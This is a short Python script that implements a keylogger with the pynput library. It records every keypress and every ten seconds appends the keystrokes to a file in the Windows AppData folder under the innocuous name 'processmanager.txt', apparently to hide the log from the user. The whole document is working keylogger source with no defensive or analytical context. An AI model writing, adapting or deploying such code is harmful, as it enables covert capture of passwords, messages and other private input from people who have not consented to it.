#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/20/2021

from pynput import keyboard
import threading
import os

log = ""
path = os.environ["appdata"] + "\\processmanager.txt"

def process_keys(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.right or key == key.left or key == key.left or key == key.right:
            log += ''
        else:
            log+= str(key) + " "

    print(log)

def report():
    global log 
    global path
    fil = open(path, 'a')
    fil.write(log)
    log = ""
    fil.close()
    timer = threading.Timer(10, report)
    timer.start()


def start():
    keyboard_listener = keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        report()
        keyboard_listener.join()
